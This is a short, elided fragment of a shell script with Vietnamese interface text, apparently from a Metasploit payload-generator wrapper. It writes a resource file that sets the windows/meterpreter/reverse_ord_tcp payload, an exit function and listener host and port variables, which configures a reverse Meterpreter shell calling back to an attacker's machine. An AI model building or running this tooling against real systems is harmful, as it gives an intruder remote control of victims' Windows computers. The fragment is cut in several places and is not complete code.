...
no="     Không "
cat << !
Các tùy chọn của tải trọng (windows/meterpreter/reverse_ord_tcp):
...
config_file="$payload_path_present/Config/config"
	echo "set payload windows/meterpreter/reverse_ord_tcp" >> $rc_file
	echo "set EXITFUNC $exitfunc" >> $rc_file
	paylo="windows/meterpreter/reverse_ord_tcp"
	lhost=$lhost
	lport=$lport
}
